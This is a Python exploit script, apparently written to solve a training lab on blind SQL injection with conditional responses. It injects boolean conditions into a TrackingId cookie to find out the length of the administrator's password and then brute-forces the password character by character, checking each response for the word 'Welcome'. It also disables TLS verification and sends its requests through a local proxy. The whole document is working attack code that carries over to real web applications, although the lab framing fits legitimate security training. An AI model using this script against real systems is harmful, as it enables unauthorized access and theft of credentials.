#!/usr/bin/python3

#This is a Python script for Lab: Blind SQL injection with conditional responses

import requests
import sys
import urllib3
import string

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080'}

chars = "abcdefghijklmnopqrstuvwxyz0123456789"

try:
    url = sys.argv[1]
except(IndexError):
    print("[i] Usage: python3 exploit.py <url>")
    print("[i] Example: python3 exploit.py https://www.example.com")
    sys.exit(-1)

s = requests.Session().get(str(url))
cookies = s.cookies.get_dict()
trackingID = cookies.get("TrackingId")

def bruteforce(url):
    try:  
        password = ""
        for j in range(password_length(url)+1):
            for i in string.digits + string.ascii_letters:
                            
                payload = trackingID+"' AND SUBSTRING((SELECT password FROM users WHERE Username = 'administrator'),"+str(j)+", 1) = '"+i
                pl_cookies = {"TrackingId":payload,"session":cookies.get("session")}
                res = requests.get(url,cookies=pl_cookies,verify=False,proxies=proxies)

                if 'Welcome' in res.text:
                    password += i
                    sys.stdout.write("\r[*] Administrator's password: " + password)
                    sys.stdout.flush()
                    break               
                else:
                    sys.stdout.write("\r[*] Administrator's password: " + password)
                    sys.stdout.flush()
    except(TypeError):
        print("[!] Something went wrong! Please, check your syntax.")
        sys.exit(-1)

def password_length(url):
    try:
        print("[i] Calculating the password length...")
        length = 1
        while True: 
            payload = trackingID+"' and (select username from users where username='administrator' and LENGTH(password)="+str(length)+")='administrator'--''"
            pl_cookies = {"TrackingId":payload,"session":cookies.get("session")}
            res = requests.get(url,cookies=pl_cookies,verify=False,proxies=proxies)
            if 'Welcome' in res.text:
                print("[i] Password length is: "+str(length))
                return length
                break
            else:
                length +=1  
    except(TypeError):
        print("[!] Something went wrong! Please, check your syntax or make sure your proxy is running.")
        sys.exit(-1)

def main():  
    bruteforce(url)

if __name__ == "__main__":
    main()
